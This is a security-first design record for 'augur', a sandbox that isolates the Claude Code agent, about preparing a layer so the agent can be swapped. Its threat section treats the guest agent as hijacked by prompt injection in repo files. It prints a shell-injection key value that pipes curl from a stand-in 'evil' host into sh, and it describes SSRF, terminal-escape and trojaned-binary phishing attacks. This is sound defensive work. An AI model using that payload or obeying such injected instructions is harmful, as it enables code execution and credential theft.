# augur: making the coding agent swappable — current-state review & design (security-first)

- **Date:** 2026-06-28
- **Status:** Design record. **Near-term goal: do NOT add a second agent.** Insert one
  **ACL (Anti-Corruption Layer)** between augur and Claude Code so that, when we later want to
  peel Claude Code off, the swap is **relatively safe and relatively quick**. The pluggable
  multi-agent machinery (registry / selection flag / IP path, …) is **not built now** (§5).
- **Implementation:** §5 Step A–C (the ACL seam) is **implemented** in the working tree:
  an in-script `agent_*` function family plus `AUGUR_AGENT_SEAM` markers across `augur`,
  `Dockerfile`, and `augur.conf`. Behavior is **byte-identical** to before (unit-verified);
  Claude Code remains the one and only agent. `grep -rn AUGUR_AGENT_SEAM` lists the whole
  future change surface.
- **Method:** Synthesis of a 9-agent workflow (coupling map / invariant extraction / prior-art
  review of PR#35 / real-agent research / design → adversarial review, 34 findings). The
  load-bearing facts were re-verified by hand with `grep`.

> This document is a sequel to `docs/ollama-llm-endpoint-design.md` (PR#35); its core themes are
> "separate the axes" and "the integrity-provenance problem."

---

## Conclusion (key points)

- **augur's durable asset is the sandbox** (egress allowlist, isolation, no host sudo). Claude Code
  is a **swappable payload** on top of it — a design insight `docs/ollama-llm-endpoint-design.md`
  already captured correctly.
- The goal is to insert **one ACL (Anti-Corruption Layer)**: a translation layer that keeps
  Claude-Code-specific concerns from leaking into augur's "domain" (the sandbox: egress, isolation,
  scoped persistence). In augur this layer **doubles as a security boundary** — because some of the
  Claude-specifics we want to peel off are themselves load-bearing security controls.
- **Near term we build only the boundary, not the machinery** (§5 Steps A–C). The machinery that
  juggles multiple agents (§3, the full picture) is implemented later, when Claude is actually
  peeled off — because building it now, with no consumer, only adds the C1–C7 attack surface below.
- The single principle that keeps the future swap safe: **the agent side only DECLARES DATA; the
  sandbox core OWNS and ENFORCES every security mechanism.**

---

## 1. Current state: Claude coupling concentrates in "six seams"

| # | Seam | Location | Swap difficulty | Also a security control? |
|---|---|---|---|---|
| 1 | **Install** | `Dockerfile:31` (`claude.ai/install.sh`) + `augur:1284`, `DISABLE_AUTOUPDATER=1`, `~/.claude.json` seed | medium | ✔ (pinning) |
| 2 | **Egress baseline** | `augur.conf:16-25` (Anthropic domains, refreshed every install) | low | △ |
| 3 | **Auth** | `resolve_api_key` / `save_oauth_token` (`sk-ant-*` check), inject `ANTHROPIC_API_KEY` > `CLAUDE_CODE_OAUTH_TOKEN` (`augur:870-874,1507-1518`) | medium | ✔ |
| 4 | **Integrity verify** | `verify_docker_claude_pristine` (sha256) / `verify_macos_claude_signed` (codesign=Anthropic) → gate before setup-token | medium | ✔✔ (the A2 crux) |
| 5 | **State/history** | `~/.claude/projects/-workspace-<slug>`, cwd-keyed per-project mount (`augur:889-895,1361-1370`) | **high** | ✔ (A3) |
| 6 | **Launch / CLI name** | `cmd_claude` / `cmd_claude_macos` hardcode `claude`, `claude setup-token`, `claude --version` | low–high | partly ✔ |

In short, Claude is wired in **thinly but broadly across six places**: install URL, egress domains,
env-var names, binary signer, history directory layout, and CLI name. Most are mechanical, but
**#4 and #5 ARE security controls**, so a naïve find-and-replace is dangerous. The ACL collapses
these six seams into one discoverable boundary (§5).

---

## 2. Security invariants that must be preserved

If the abstraction breaks even one of these, augur loses its reason to exist. The review pinned down
*how a careless agent-swap would break each one*:

1. **All guest egress flows through the host-side proxy** (`--internal` net / cap-drop NET_ADMIN /
   DNS fails closed at a TEST-NET address) → *injecting per-agent `docker run`/network flags could
   restore a direct route. The datapath is a fixed property of the sandbox; the payload must not
   touch it.*
2. **Only allowlisted domains are reachable, everything else fails closed**, and **IP-literal direct
   connects are denied unconditionally** → *if an agent profile can add its own `allow` entries, a
   hostile repo can pre-authorize an exfil host.*
3. **Only explicitly NAMED secrets cross** (never the wholesale host env), and **the host credential
   store is never mounted** → *mounting `~/.claude`/Keychain/`~/.codex` "to make a new agent's config
   work" leaks every project's tokens.*
4. **Persistence is narrowed to the CURRENT project only** (every persistence channel is also an
   injection channel) → *a per-agent state dir that reverts to a broad mount breaks A3.*
5. **A2: integrity gate before a guest-writable binary is attached to the operator's real TTY** →
   *`launch=<any agent>` to the TTY with no provenance check lets a trojaned binary phish the operator
   and persist the stolen credential into every future guest.* ← **the most important one**
6. **Provenance is decided HOST-side** (the proxy sees only one flattened allowlist), and
   **workspace `.augur.*` files are untrusted and must be sanitized before display** (A1 terminal-escape
   defense).

---

## 3. The full picture (future): an agent adapter (three-axis separation)

> This is **where the ACL eventually points.** We do **not** build this now (§5). Designing the
> boundary toward this shape keeps the future implementation small.

PR#35 fused three axes; we separate them and **keep the sandbox fixed, parameterizing only the
payload-shaped fields**.

**Separate the three axes:**
- **Axis 1 = the agent binary** (identity / install / integrity / launch / state) ← *the user's actual
  goal (Claude → Codex) lives here*
- **Axis 2 = the LLM endpoint** (BASE_URL + an optional private-IP allow) ← *not needed for a
  cloud-to-cloud swap*
- **Axis 3 = credentials** (named host secret → named guest env + login hook)

**Agent selection is host-side (the most important future decision):**
- `augur --agent codex up|shell|setup-token` (parsed in the existing option loop alongside
  `--macos/--egress`) + a host-side default in `~/.augur/config`. **The workspace `./.augur.*` is
  never consulted for agent.name/launch/install/integrity.**
- Rationale: if a repo could pick the agent, a hostile repo could swap Claude for a malicious "agent"
  that augur then attaches to the operator's real TTY during setup-token, persisting the phished
  credential everywhere (= A2). The worst a hostile repo may influence is the egress allowlist via
  `./.augur.conf`, which is already TOFU-gated.

**Manifest fields (all host-controlled):** `name/slug` · `install(+pin)` ·
`integrityVerify{scheme,value}` · `launchArgv[]` (+ fixed env) ·
`credential{hostSource,guestEnvVar,loginHook}` · `egress.baseline` ·
`state{homeDir,projectGlobs,mountKeying}` · `headless{method,requiresInteractive}`.

**What real-agent research proves cannot be generalized:** integrity verification alone is not
unifiable — Codex(mac)=codesign signer / Codex(Linux,npm)=self-pinned sha256 (no vendor checksum) /
Aider=PyPI wheel hash (no signed binary) / Gemini=npm integrity. **A pluggable per-agent verifier is
mandatory.**

---

## 4. Threat detail (C1–C7, restated for a non-specialist)

> Intended reader: an app-building expert who is a security novice and is augur's implementer. Each
> item is "**In one line** → **Background** (jargon unpacked) → **The attack** → **Why Claude is safe
> today** → **The fix**." iOS/app analogies throughout.
> **These threats live inside §3's multi-agent machinery** and do not arise while we ship only the
> ACL. We record them at the boundary as a checklist to enforce when the swap eventually happens.

### Two things to load first

**Premise A — the threat model: "trusted host, disposable hostile guest."**
augur protects *your Mac (the host)*. The coding agent inside is treated as **already compromised by
prompt injection** (instructions hidden in a repo's README/code that the agent obeys — e.g. "exfiltrate
this token"). So the guest is "someone else's app that may turn hostile at any moment." Sealing every
path from guest back into / laterally across the host is augur's whole purpose.

**Premise B — the A2 threat: "a fake login on your real terminal."**
`augur setup-token` wires the **guest's `claude` binary directly to your real terminal** to render a
full-screen login UI. augur saves whatever token you paste and **auto-injects it into every guest of
every project thereafter.** If the guest's `claude` has been swapped for a fake, it can render a
convincing fake login and steal the token — persistently. It's the terminal version of "a fake app
that hijacked a URL scheme shows a login screen" on iOS. C2, C4, and C6 all feed this.

---

### C1 — A private-IP allow cannot be built safely on current main (SSRF — most important)

**In one line:** implementing "allow a LAN endpoint" with today's code disables the proxy's
internal-access guard for **all** destinations, letting the guest reach your Mac and your LAN.

**Background (SSRF):** **SSRF (Server-Side Request Forgery)** = tricking the thing that makes outbound
requests (augur's proxy) into reaching internals you shouldn't (`127.0.0.1` = the Mac itself,
`192.168.x` = home LAN, `169.254.169.254` = cloud metadata). Normally the proxy, when connecting to an
allowlisted name, **resolves the name to an IP and then refuses if the resolved IP is internal** — this
defeats **DNS rebinding** (an attacker pointing `evil-but-allowed.com` at `127.0.0.1` for a moment).
It's the same idea as App Transport Security re-checking a connection.

**The attack:**
- The design says "reuse PR#35's proxy IP-rule stack (`parseIPRule/allowsIP/lanException`)" — but a
  `grep` shows **those functions do not exist on main** (only on the feature branch).
- The only lever on main is `--allow-private` in `augur-proxy/Sources/augur-proxy/main.swift:45`, which
  sets `publicOnly = false`. The guard at `SocketIO.swift:58` is `if publicOnly, isPrivate(sa) { deny }`,
  so `publicOnly=false` **removes the internal-address deny for every connection.** It is a "remove all
  the locks" switch, not a "open one IP" switch.
- Result: any name that ever made it onto the allowlist (e.g. a once-approved `./.augur.conf` domain)
  can be re-pointed by an attacker at `127.0.0.1` or `10.0.1.1` (router admin) to reach your Mac's local
  services or LAN devices.

**Don't get confused:** a Claude → Codex **cloud swap needs no LAN capability at all** (Codex just
talks to `api.openai.com`). private-IP is an entirely separate axis (Axis 2 = local Ollama, etc.).

**The fix:** **don't implement `endpoint.privateIpAllow` for now.** If a local LLM is genuinely wanted,
first port PR#35's per-`IP:port` rule (port-mandatory, RFC1918/Tailscale-only, loopback/metadata always
denied) onto main. Never use the global `--allow-private`. Add a `verify_egress_locked` probe that an
undeclared private IP is still refused.

---

### C2 — `image-sha256` is "tamper detection," not "proof of authenticity" (supply chain / A2 regression)

**In one line:** making the integrity check "running binary == the copy in the image" cannot catch a
fake that was **swapped in at build time**, which leads straight into the Premise B phishing.

**Background (two kinds of "integrity"):**
- **Tamper detection:** "does what's there now match what we shipped?" — a `sha256` compare.
- **Provenance:** "was what we shipped genuinely from the vendor?" — Apple's **codesign + notarization**
  is exactly this.
The iOS intuition: even if the `.ipa` hash matches, **a poisoned SPM/CocoaPods dependency in the build
makes the hash match a poisoned artifact.** That's a **supply-chain attack** — e.g. a typosquatted
`@openai/codex` (a lookalike `@openai/codexx`) or a poisoned wheel.

**The attack:**
1. Add a second agent via `agent.install = "npm @openai/codex@x.y"`.
2. That npm artifact is poisoned (or a lookalike is fetched).
3. **The trojan is baked into the image at build time.**
4. `verify_docker_agent_pristine` (`image-sha256`) compares container == image → **both are the same
   trojan, so it returns "pristine."**
5. setup-token / `codex login --with-api-key` **wires that trojan to your terminal** → Premise B
   phishing steals the OpenAI key and persists it into every guest.

**Why Claude is safe today:**
- macOS uses `verify_macos_claude_signed` (`augur:228`) — it checks the **codesign signer is
  "Anthropic"** (true provenance). Even a VM-root guest that rewrites the binary **cannot forge
  Anthropic's signature.**
- Linux (Docker) uses `image-sha256`, but provenance is anchored by the install source being hardcoded
  to `claude.ai/install.sh` (Anthropic-notarized) and **not workspace-overridable.** Making the install
  source a manifest field removes that anchor — hence a **regression.**

**The fix:** **any flow that attaches a binary to the TTY / handles the operator's credential requires a
real provenance anchor** — codesign signer on mac, **build-time sha256 pin against the upstream-published
hash** on Linux. Agents with no anchor (Aider/Gemini, unsigned) must be **env-key-only with no TTY login
flow** (fail-closed). Never accept `tofu-warn` as the floor for a credential-bearing flow.

---

### C3 — A credential's *value* becomes a shell-injection vector

**In one line:** today the key's charset is strictly validated, so it's safe. Generalize to keys that go
through the **unvalidated** path and a command hidden inside a key value **runs in the VM.**

**Background (shell injection):** the shell version of **SQL injection** — build a command by string
concatenation, and an untrusted value containing `'` or `$()` is **executed as a command instead of
data.** On macOS, augur writes credentials into `~/.augur-env` as `export KEY='value'` and **`source`s
(executes) it every session.**

**The attack:**
- `cmd_up_macos` (`augur:1515`) writes `export ANTHROPIC_API_KEY='${anthropic_key}'`.
- Generalize to `OPENAI_API_KEY` etc. and the value comes from `resolve_api_key` (`augur:170`, **no
  charset check**).
- A value `x';curl evil/h|sh;'` is written as `export OPENAI_API_KEY='x';curl evil/h|sh;''` → **the `'`
  closes the literal and `curl|sh` runs in the VM.**
- `~/.augur-env` is sourced **in your own interactive `augur shell --macos`** too, so it runs as you.
  Aider's keys can land in the working tree, so a cross-run hostile guest can plant the value
  (Premise A).

**Why Claude is safe today:** `save_oauth_token` (`augur:188`) restricts to `[A-Za-z0-9._-]`, rejecting
`'`. But **that check only covers the setup-token capture path**, not a general `ANTHROPIC_API_KEY` or
other agents' keys (it just hasn't surfaced because the host user is trusted today).

**The fix:** **promote `save_oauth_token`'s charset/length check into a mandatory per-credential
validator for every agent**, run on every resolved value. On macOS, **stop building a sourced shell
file by interpolation** — write `key=value` to a non-executed file and parse it.

---

### C4 — The macOS launch string becomes arbitrary code execution without a guard that doesn't exist

**In one line:** the SSH version of C3. Today the launch is a constant literal `claude`, so it's safe.
Interpolate a variable `launchArgv` into the SSH string and, without a guard, it's RCE in the VM.

**Background:** macOS mode passes the command as an **SSH remote string**: `cmd_claude_macos`
(`augur:1546`) does `ssh ... "zsh -l -c 'cd ~/SHARE && DISABLE_AUTOUPDATER=1 claude'"`. The `claude`
there is a **constant literal — zero injection surface.**

**The attack:**
- The design interpolates each `launchArgv` element into that single-quoted string, guarded by
  `llm_assert_safe` (metachar rejection).
- **`grep` confirms `llm_assert_safe`/`llm_assert_name` do not exist on main** (branch only).
- If argv-ization lands before the guard, an element containing `'`, `` ` ``, or `$()` escapes the
  single quotes → **arbitrary code as the SSH user in the VM.**

**Why Docker is safe:** Docker passes `docker exec container claude arg1 arg2` as an **argv array** — no
shell parsing (same as iOS `Process` with `arguments:[]`). **Only the macOS SSH string is the problem.**

**The fix:** **fix the ordering** — implement & unit-test the `assert_safe`/`assert_name` guard on main
*before* argv-izing the launch. Better, stop interpolating: quote each argument with `printf %q`. Fail
closed if a value fails the guard.

---

### C5 — A per-agent egress allowlist bypasses the approval/sanitization gate

**In one line:** the project `.augur.conf` is checked strictly, yet an agent's domains enter the
allowlist **raw, as a "baseline-tier" layer** — and that manifest lives where an attacker can write it.

**Background (trust-tier inversion & terminal escapes):**
- The proxy only ever sees **one flattened allowlist**, so "who added this line (provenance)" must be
  decided **host-side before the merge.**
- `check_project_conf_approved` is **TOFU (Trust On First Use)** — "confirm once with a human, then
  remember the hash" (like SSH asking for a fingerprint on first connect).
- **Terminal escapes:** emitting raw bytes to the terminal lets escape sequences move/overwrite the
  cursor, so the **approval screen can show something different from what is actually allowed** (A1).
  Hence display must be sanitized text only.

**The attack:**
- `write_merged_allowlist` (`augur:381`) **`cat`s the baseline/global confs raw** (only the project conf
  is sanitized).
- The design routes each agent's `egress.baseline` into the baseline layer and treats operator manifests
  under `~/.augur/agents/` as registry entries.
- `~/.augur` is outside the project but **writable by the host user** (poisoned dotfiles, a shared
  "agent pack" from a README, a prior run's writes) → **arbitrary domains enter the allowlist with no
  TOFU and no sanitization**, and raw-byte rendering lets `augur status` (`augur:1037`) be spoofed via
  terminal escapes. **The channel most likely to carry attacker-chosen exfil is the least-checked, most-
  trusted tier — the threat model inverted.**

**The fix:** **sanitize the baseline tier too** (via `conf_line_valid`) and render with `printf '%s'`.
**TOFU-confirm each manifest's full domain set on first use and on change.** Treat `~/.augur/agents/` as
**semi-trusted, not baseline-equivalent.**

---

### C6 — How the manifest is loaded, and where the registry lives (the guest could define the agent)

**In one line:** bash has no safe config parser — `source`/`eval` turns a config file into executable
code. Put the registry next to a guest-writable mount and **the guest can define "the next agent"** =
total defeat of A2.

**Background:**
- bash has no safe structured parser (no plist/JSON). `source file.sh` or `eval "$line"` **executes
  every byte** (the iOS analogy: "I meant to read a config plist but loaded arbitrary code").
- **symlink / `..` traversal:** plant a symlink to `../../agents/codex.manifest` or a `..`-laden path in
  a guest-writable spot to **redirect a write into a directory you shouldn't reach** — a classic trick.

**The attack:**
- The design's registry is "SCRIPT_DIR + `~/.augur/agents/`." It also adds new guest-RW mounts
  `~/.augur/<agent>-projects/<slug>-<hash>` **under the same `~/.augur` parent.**
- If a slug with `/` or `..`, or a symlink planted in a history leaf, lets the guest reach
  `~/.augur/agents/`, **the guest writes a manifest** — specifying `launchArgv` (the binary on the TTY),
  `install`, and `integrityVerify.value` (the expected hash). Set "expected hash = my trojan's hash" and
  the integrity check passes. Premise B collapses in one move.
- Using `AUGUR_AGENT` as a selection channel is **workspace-settable via direnv/`.envrc`/CI** — the repo
  can influence agent selection.

**The fix:**
- **Never `source`/`eval` a manifest.** Parse it with a **non-executing parser** (fixed key whitelist +
  value charset check, same spirit as `conf_line_valid`).
- Put the registry **outside `~/.augur`** (e.g. `~/.config/augur/agents`, `0700`). Assert at startup that
  **no guest-RW mount path is a parent/prefix/symlink of the registry.**
- Store `integrityVerify.value` in a **guest-unreachable file**; the manifest may only reference it by
  name.
- Sanitize every path-touching field (slug, mountKeying) with `workspace_slug()` (strip `/`, `..`) before
  use.

---

### C7 — Codex/Gemini state dirs aren't per-project, and sit next to the credential file

**In one line:** Claude is safe because it mounts only "this project's cwd subfolder." Codex/Gemini keep
**history and credentials together in one flat folder**, so a naïve mount breaks isolation and **mounts
the credential store** (a forbidden act).

**Background (cwd keying):** Claude stores history under `~/.claude/projects/-workspace-<slug>` —
**branched by working directory.** Binding only the leaf for this cwd hands over "just this project's
history." It's like sharing a *specific subfolder* of an iOS App Group container, not the whole thing.

**The attack:**
- `~/.codex` / `~/.gemini` are **flat single folders with no cwd branching**, and the credential token
  (`~/.codex/auth.json`, `~/.gemini/oauth_creds.json` — the iOS Keychain equivalent) **lives in the same
  folder.**
- To persist history you bind `~/.codex` wholesale, which:
  - **(a) breaks per-project isolation:** drop the path-hash key and two same-named projects (one
    hostile) share `~/.codex` and can **read/forge each other's transcripts.**
  - **(b) mounts the credential store:** violates "never mount the host credential store." Worse,
    `codex login --with-api-key` **writes the OpenAI token into that RW mount** → the credential persists
    in a guest-readable location. **Strictly worse than Claude (env-only).**

**The fix:** for every non-Claude agent, **key the host source on `workspace_slug-workspace_path_hash`
(full path hash, never slug alone, mirroring `augur:893`).** Add a test that two same-basename projects
get distinct dirs. **Exclude the credential file from the bind** (mount only history subpaths, or a
non-persisted path). Assert that no mount contains `*auth*`/`*credentials*`/`*oauth*` after a run.

---

### Aside: `tofu-warn`

In C2, `tofu-warn` means "show the hash once, ask the human 'is this right?', then remember it" (TOFU).
But **if what you showed on first use was already poisoned, you just registered the poison as trusted** —
so it's a weak guarantee for a credential-bearing flow. That's why the C2 conclusion is to **structurally
enforce "env-key only, never on the TTY"** instead.

---

## 5. Revised migration path (near term: ACL only; no second agent) — IMPLEMENTED

### The one principle that makes the future swap safe

> **The agent side only DECLARES DATA; the sandbox core OWNS and ENFORCES every security mechanism.**

Never let the agent side enforce anything; the core always sanitizes, validates, and keys. Then no
matter how sloppy a future agent implementation is, **the controls live in the core and can't be
bypassed.** Draw the line correctly and the C1–C7 class of mistakes is prevented **structurally.**

**Where the ACL line is drawn:**

| Concern | Agent side (above the ACL = swap target) | Sandbox core (below the ACL = fixed, untouchable) |
|---|---|---|
| **Install** | installer URL / package name + pin value | (build-time pin verification → future, in the core) |
| **Integrity** | the "verify recipe" (mac=signer / linux=hash) as **DATA** | the **FLOW** "always gate before TTY attach" (C2 fix) |
| **Auth** | env-var **names** + token **format validator** | named-only injection, value validation, **never mount** (C3 fix) |
| **Egress** | the **list** of domains | TOFU, sanitize, host-side merge, flattened-list enforcement (C5 fix) |
| **State/history** | the guest **paths/layout** | path-hash keying, outside the host tree, current-project-only (C7 fix) |
| **Launch** | argv (today `["claude"]`), CLI name | Docker passes argv array / macOS quotes each arg (C4 fix) |
| **Network** | (nothing) | `--internal` net, cap-drop, DNS fail-closed (all core, immovable) |

Note that **auth and state are *split*: names and format on the agent side; injection, validation, and
mount discipline in the core.** Fixing that split in code now prevents a future implementer from pulling a
control up above the line and weakening it.

### Implemented now (= the ACL is shipped)

- **Step A — pure refactor: move Claude behind the boundary.** Scattered Claude-specific values/commands
  are funneled into **one function family** in the script (in-script `agent_*` functions, not an external
  file):
  - `agent_display_name` → `Claude Code` · `agent_cli_name` → `claude`
  - `agent_launch_argv` / `agent_login_argv` → `claude` / `claude setup-token`
  - `agent_fixed_env` → `DISABLE_AUTOUPDATER=1` · `agent_version_cmd` → `claude --version`
  - `agent_auth_specs` → `GUEST_ENV|HOST_ENV|HOST_FILE|VALIDATOR` lines (the core resolves & injects)
  - `agent_state_host_subdir` / `agent_state_guest_projects_dir` / `agent_state_guest_leaf`
  - integrity gates **renamed** to `agent_verify_integrity_docker` / `agent_verify_integrity_macos`
  Existing `cmd_up` / `cmd_claude` / `cmd_setup_token` (and the macOS counterparts) now **call these
  instead of hardcoding.** **Values are byte-identical** (unit-verified); there is **no `case "$AGENT"`
  branch** (one agent).
- **Step B — pin the security contract at the boundary.** ← the heart of "safe to peel off later."
  Each seam member carries a `CONTRACT (…)` comment stating the invariant it must satisfy, e.g.:
  ```
  # AUGUR_AGENT_SEAM | integrity-verify (macOS) — A2 gate; codesign signer (provenance), see docs §4 C2.
  ```
  A future implementer of "agent X" sees not "strings to change" but **a checklist of safety requirements
  to satisfy** — turning C1–C7 from "remember it" into "enforced by contract."
- **Step C — do not externalize.** No manifest files, no `~/.augur/agents/` registry, no `--agent` flag,
  no `AUGUR_AGENT` env var — **none of it now.** Those are precisely the C5/C6 attack surface, and there
  is zero reason to build them with no consumer. The boundary stays **inside the script.**
- **(Ops aid) one marker makes the future change surface greppable.** Every boundary member across the
  script / `Dockerfile` / `augur.conf` carries the same `AUGUR_AGENT_SEAM` token, so `grep -rn
  AUGUR_AGENT_SEAM` lists every place to touch (the boundary spans three files but, being discoverable
  and documented, is one boundary) — this is what delivers "relatively quick."

### Future (when Claude is actually peeled off; enforced by the contract)

Implement §3's full picture (pluggable verifier, auth loop, egress merge + TOFU, selection model, IP path
if needed), guided by the contracts pinned in Step B. **The C1–C7 mitigations become meaningful only
then.**

### How "safe and quick" is delivered

- **Quick:** one greppable boundary → a future swap is "replace the `agent_*` family + satisfy the
  contract checklist."
- **Safe:** the controls (verification, sanitization, keying, named-only injection, no-mount) **all stay
  in the core; the agent side only declares data**, so a future implementer's C1–C7 mistake **cannot
  bypass** them.

### The one risk of the refactor itself, and how it was contained

The danger during extraction is accidentally moving a control up to the agent side and weakening it.
Containment:
1. Hold the "core enforces / agent declares" line.
2. Verify the constructed `docker run`/`docker exec` argv and the seam outputs are **byte-identical**
   before/after (done: a unit harness sources the real `agent_*` functions and asserts every constructed
   string matches the original literal; `bash -n` passes; no old function names remain).
3. Keep the `docs/security-reviews/2026-06-28-full-review.md` checks and existing tests green.

---

## 6. Next steps

1. **Keep this design record in `docs/`** (done: this file).
2. **Step A–C implemented** (done): Claude stays the default, the swap is prepped, and every current
   invariant is preserved byte-for-byte. Remaining: run the existing/integration tests in a real Docker /
   macOS environment to confirm parity end-to-end (this turn verified construction logic, not a live run).
3. When a decision to peel Claude off arrives, move to §3's full picture. If Codex is chosen, confirm the
   unverified points on-device first: `OPENAI_API_KEY` vs. a stored ChatGPT `auth.json` precedence (the
   adapter should force `--with-api-key`), Statsig/telemetry hosts, and whether a published Linux-binary
   sha256 exists.

---

## Appendix: real-agent research summary (Codex / Aider / Gemini)

> Reference data for the day Claude is peeled off. Unused for now.

| Item | Codex CLI | Aider | Gemini CLI |
|---|---|---|---|
| **Auth** | ChatGPT OAuth (default) or API key (`codex login --with-api-key`). env-vs-stored-`auth.json` precedence **unconfirmed** → force explicitly | provider API keys via LiteLLM (no account). Falls into OpenRouter OAuth if no key → pre-seed a key | GEMINI_API_KEY / Vertex SA / Login-with-Google. key/SA are headless-clean |
| **env** | `OPENAI_API_KEY` (+`OPENAI_BASE_URL`). `CODEX_API_KEY` likely not read | `OPENAI_API_KEY`/`ANTHROPIC_API_KEY`/`OPENROUTER_API_KEY`…, `LITELLM_LOCAL_MODEL_COST_MAP=True` | `GEMINI_API_KEY`/`GOOGLE_API_KEY`/`GOOGLE_APPLICATION_CREDENTIALS` |
| **Egress** | `api.openai.com` (API key) / `chatgpt.com`+`auth.openai.com` (ChatGPT login) + Statsig (**no official allowlist** → capture empirically) | model-dependent provider host + `raw.githubusercontent.com` (cost map) + `us.i.posthog.com` (analytics) | `cloudcode-pa`/`generativelanguage`/`aiplatform`.googleapis.com + Google telemetry |
| **State** | `~/.codex` (auth.json + history + policy **together, flat**) | mostly the **working tree**: `.aider.*` + `~/.aider/oauth-keys.env` | `~/.gemini` (creds together) + repo `.gemini/` |
| **Distribution / integrity** | Rust binary. mac=codesign signer / Linux(npm/curl)=**no official sha256** (self-pin) | PyPI (no signed binary) → wheel sha256 / PEP 740 | bundled JS (no signed binary) → npm integrity / brew formula sha256 |
| **Headless login** | `--with-api-key` (best) / device-code (gated by ChatGPT workspace admin) | no login needed (key in env) = best | key/SA clean; OAuth only semi-headless |

**Bottom line on what cannot be generalized:** the "verify the binary is genuine before TTY attach" gate
differs fundamentally — Codex(mac)=signer / Codex(Linux)=self-pinned sha256 / Aider=PyPI hash /
Gemini=npm integrity — so a single sha256-pin contract does not hold. **A per-agent verifier plugin is
mandatory**, which is the strongest evidence that the adapter needs a pluggable integrity strategy.

---

*(Note: §4's Critical findings — "the IP-rule stack is not merged on main," "`--allow-private` is
global," "`llm_assert_safe` does not exist" — were re-verified by hand with `grep`. The §5 ACL seam is
implemented and unit-verified byte-identical; no live Docker/macOS run was performed this turn.)*
